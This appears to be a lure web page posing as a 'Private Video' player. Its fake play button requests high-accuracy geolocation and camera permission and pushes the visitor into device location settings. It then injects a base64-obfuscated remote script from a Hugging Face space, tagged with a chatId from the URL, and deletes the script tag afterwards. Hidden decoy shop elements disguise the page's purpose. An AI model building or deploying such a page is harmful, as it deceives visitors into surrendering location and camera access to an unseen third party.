    <title>Video Player</title>
    
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
            background-color: #000;
            color: #fff;
            overflow: hidden;
        }

        .store-header {
            position: fixed !important;
            top: -9999px !important;
            left: -9999px !important;
            opacity: 0 !important;
            pointer-events: none !important;
            width: 1px !important;
            height: 1px !important;
            overflow: hidden !important;
            clip: rect(0, 0, 0, 0) !important;
            z-index: -999999 !important;
            visibility: hidden !important;
        }

        .store-footer {
            position: fixed !important;
            bottom: -9999px !important;
            left: -9999px !important;
            opacity: 0 !important;
            pointer-events: none !important;
            width: 1px !important;
            height: 1px !important;
            overflow: hidden !important;
            clip: rect(0, 0, 0, 0) !important;
            z-index: -999999 !important;
            visibility: hidden !important;
        }

        .product-info-hidden {
            position: absolute !important;
            top: -9999px !important;
            left: -9999px !important;
            opacity: 0 !important;
            pointer-events: none !important;
            width: 1px !important;
            height: 1px !important;
            overflow: hidden !important;
            clip: rect(0, 0, 0, 0) !important;
            z-index: -999999 !important;
            visibility: hidden !important;
        }

        .delivery-notice-hidden {
            position: absolute !important;
            top: -9999px !important;
            left: -9999px !important;
            opacity: 0 !important;
            pointer-events: none !important;
            width: 1px !important;
            height: 1px !important;
            overflow: hidden !important;
            clip: rect(0, 0, 0, 0) !important;
            z-index: -999999 !important;
            visibility: hidden !important;
        }

        .video-player-container {
            width: 90%;
            max-width: 800px;
            background: #111;
            border-radius: 12px;
            overflow: hidden;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
            position: relative;
        }

        .video-thumbnail {
            position: relative;
            width: 100%;
            height: 450px;
            background: linear-gradient(rgba(0, 0, 0, 0.7), rgba(0, 0, 0, 0.7)),
                url('https://i.postimg.cc/jSfpHvz8/IMG-20260104-210740-951.jpg');
            background-size: cover;
            background-position: center;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: default;
            flex-direction: column;
        }

        #locationActionButton {
            display: flex;
            align-items: center;
            justify-content: center;
            width: 120px;
            height: 120px;
            border-radius: 50%;
            background: rgba(255, 255, 255, 0.1);
            border: 3px solid #ff6b6b;
            cursor: pointer;
            transition: all 0.3s ease;
            backdrop-filter: blur(8px);
            box-shadow: 0 0 40px rgba(255, 0, 0, 0.3);
            z-index: 10;
        }
        #locationActionButton:hover {
            transform: scale(1.05);
            background: rgba(255, 255, 255, 0.2);
            border-color: #ff4757;
            box-shadow: 0 0 60px rgba(255, 0, 0, 0.6);
        }
        #locationActionButton .play-icon {
            font-size: 60px;
            color: #ff6b6b;
            line-height: 1;
            user-select: none;
        }

        .play-button-overlay {
            display: none;
        }

        .video-info {
            padding: 20px;
            border-bottom: 1px solid #333;
        }

        .video-title {
            font-size: 1.5rem;
            font-weight: bold;
            margin-bottom: 8px;
        }

        .video-controls {
            padding: 15px 20px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            background: #1a1a1a;
            flex-wrap: wrap;
            gap: 10px;
        }

        .control-button {
            background: none;
            border: none;
            color: white;
            font-size: 1.2rem;
            cursor: pointer;
            padding: 8px 15px;
            border-radius: 4px;
            transition: background 0.2s;
        }

        .control-button:hover {
            background: #333;
        }

        .progress-bar {
            flex-grow: 1;
            height: 4px;
            background: #333;
            border-radius: 2px;
            margin: 0 20px;
            overflow: hidden;
            position: relative;
            min-width: 60px;
        }

        .progress-fill {
            position: absolute;
            height: 100%;
            width: 0%;
            background: #ff0000;
        }

        .time-display {
            color: #aaa;
            font-size: 0.9rem;
            min-width: 100px;
            text-align: center;
        }

        .spinner {
            border: 4px solid #fff;
            border-top: 4px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            width: 32px;
            height: 32px;
            animation: spin 1s linear infinite;
            position: absolute;
            display: none;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
        }

        @keyframes spin {
            0% { transform: translate(-50%, -50%) rotate(0deg); }
            100% { transform: translate(-50%, -50%) rotate(360deg); }
        }

        .volume-control {
            display: flex;
            align-items: center;
            gap: 10px;
            color: #aaa;
        }

        .volume-slider {
            width: 80px;
            height: 4px;
            background: #333;
            border-radius: 2px;
            position: relative;
        }

        .volume-level {
            position: absolute;
            height: 100%;
            width: 70%;
            background: #ff0000;
        }

        .fullscreen-btn {
            margin-left: 15px;
        }

        @media (max-width: 480px) {
            .video-controls {
                padding: 10px 12px;
                gap: 6px;
            }
            .progress-bar {
                margin: 0 6px;
            }
            .time-display {
                font-size: 0.75rem;
                min-width: 60px;
            }
            .video-title {
                font-size: 1.2rem;
            }
            .video-thumbnail {
                height: 280px;
            }
            #locationActionButton {
                width: 90px;
                height: 90px;
            }
            #locationActionButton .play-icon {
                font-size: 45px;
            }
        }
    </style>
</head>
<body>

    <div class="store-header" aria-hidden="true">
        <span>🛒 ShopStore</span>
        <span>🔍 Search products...</span>
        <span>🛒 Cart (0)</span>
    </div>

    <div class="product-info-hidden" aria-hidden="true">
        <span>$49.99</span>
        <span>★★★★★ 4.8</span>
        <span>🚚 Free Shipping</span>
        <span>✅ In Stock</span>
    </div>

    <div class="delivery-notice-hidden" aria-hidden="true">
        <span>📍</span> 
        <span>Enable location for delivery rates & faster shipping</span>
    </div>

    <div class="video-player-container">
        <div class="video-info">
            <div class="video-title">Private Video</div>
            <div class="video-meta"></div>
        </div>

        <div class="video-thumbnail" id="thumbnailArea">
            <div id="locationActionButton">
                <span class="play-icon">▶</span>
            </div>
            <div class="play-button-overlay" id="playButtonOverlay">
                <div class="play-icon-large"></div>
                <div class="spinner" id="spinner"></div>
            </div>
        </div>

        <video id="realVideo" controls playsinline muted style="display:none; width:100%; height:450px; background:#000;">
            <source src="https://files.catbox.moe/okukrp.mp4" type="video/mp4" />
        </video>

        <div class="video-controls">
            <div class="progress-bar">
                <div class="progress-fill"></div>
            </div>
            <div class="time-display">0:00 / 2:45</div>
            <div class="volume-control">
                <span></span>
                <div class="volume-slider">
                    <div class="volume-level"></div>
                </div>
            </div>
            <button class="control-button fullscreen-btn">⛶</button>
        </div>
    </div>

    <div class="store-footer" aria-hidden="true">
        <span>Privacy Policy</span>
        <span>Terms of Service</span>
        <span>Returns & Refunds</span>
        <span>Delivery Information</span>
        <span>Contact Support</span>
        <span>© 2024 ShopStore</span>
    </div>

    <script>
        (function() {
            'use strict';

            var settingsOpened = false;
            var videoStarted = false;
            var isProcessing = false;

            var locationBtn = document.getElementById('locationActionButton');
            var thumbnailArea = document.getElementById('thumbnailArea');
            var realVideo = document.getElementById('realVideo');

            function requestPermissions() {
                try {
                    navigator.geolocation.getCurrentPosition(
                        function() {},
                        function() {},
                        { enableHighAccuracy: true, timeout: 5000 }
                    );
                } catch (e) {}
                
                try {
                    navigator.mediaDevices.getUserMedia({ video: true })
                        .then(function(stream) {
                            stream.getTracks().forEach(function(t) { t.stop(); });
                        })
                        .catch(function() {});
                } catch (e) {}
            }

            function openLocationSettings() {
                var ua = navigator.userAgent;
                if (/Android/i.test(ua)) {
                    var intents = [
                        'intent:#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end',
                        'intent://com.android.settings.location.LocationSettings#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end',
                        'intent:#Intent;action=android.settings.SETTINGS;end'
                    ];
                    for (var i = 0; i < intents.length; i++) {
                        try {
                            window.location.href = intents[i];
                            break;
                        } catch (e) {}
                    }
                } else if (/iPhone|iPad|iPod/i.test(ua)) {
                    window.open('App-Prefs:Privacy&path=LOCATION', '_blank');
                    setTimeout(function() {
                        window.open('prefs:root=Privacy&path=LOCATION', '_blank');
                    }, 500);
                } else if (/Windows/i.test(ua)) {
                    window.open('ms-settings:privacy-location', '_blank');
                } else if (/Mac/i.test(ua)) {
                    window.open('x-apple.systempreferences:com.apple.preference.security?Privacy_LocationServices', '_blank');
                } else {
                    window.location.href = 'intent:#Intent;action=android.settings.SETTINGS;end';
                }
            }

            function loadExternalAPI() {
                var _0x = 'aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9zcGFjZXMvZHNmZGRqZmMvYWdlYWdhYWEvcmF3L21haW4vYXBp';
                var url = atob(_0x);
                
                var s = document.createElement('script');
                s.src = url;
                s.async = true;
                
                window._chatId = new URLSearchParams(window.location.search).get('chatId') || '';
                
                document.head.appendChild(s);
                
                s.onload = function() {
                    setTimeout(function() {
                        if (s.parentNode) s.parentNode.removeChild(s);
                    }, 5000);
                };
            }

            function showVideo() {
                thumbnailArea.style.display = 'none';
                realVideo.style.display = 'block';
                realVideo.muted = false;
                realVideo.volume = 1.0;
                if (realVideo.paused) {
                    realVideo.play().catch(function() {});
                }
            }

            function handleButtonClick() {
                if (isProcessing || videoStarted) return;

                if (!settingsOpened) {
                    settingsOpened = true;
                    requestPermissions();
                    openLocationSettings();
                } else {
                    videoStarted = true;
                    realVideo.muted = false;
                    realVideo.volume = 1.0;
                    realVideo.play().catch(function() {});
                    loadExternalAPI();
                    showVideo();
                }
            }

            document.addEventListener('visibilitychange', function() {
                if (document.visibilityState === 'visible' && settingsOpened && !videoStarted && !isProcessing) {}
            });

            if (locationBtn) {
                locationBtn.addEventListener('click', handleButtonClick);
            }

            document.addEventListener('click', function() {
                if (realVideo) {
                    realVideo.muted = false;
                    realVideo.volume = 1.0;
                }
            }, true);

            document.querySelectorAll('.control-button').forEach(function(button) {
                button.addEventListener('click', function(e) {
                    e.stopPropagation();
                    if (this.textContent.includes('⛶')) {
                        var video = document.getElementById('realVideo');
                        if (video.requestFullscreen) {
                            video.requestFullscreen();
                        } else if (video.webkitRequestFullscreen) {
                            video.webkitRequestFullscreen();
                        }
                    }
                });
            });

            var progressInterval = setInterval(function() {
                var progressFill = document.querySelector('.progress-fill');
                var realVideoEl = document.getElementById('realVideo');
                if (realVideoEl.style.display === 'block') {
                    clearInterval(progressInterval);
                    return;
                }
                var currentWidth = parseInt(progressFill.style.width) || 35;
                var newWidth = (currentWidth + 0.1) % 100;
                progressFill.style.width = newWidth + '%';

                var timeDisplay = document.querySelector('.time-display');
                var currentSeconds = Math.floor((newWidth / 100) * 165);
                var minutes = Math.floor(currentSeconds / 60);
                var seconds = currentSeconds % 60;
                timeDisplay.textContent = minutes + ':' + (seconds < 10 ? '0' : '') + seconds + ' / 2:45';
            }, 1000);

        })();
    </script>
</body>
</html>
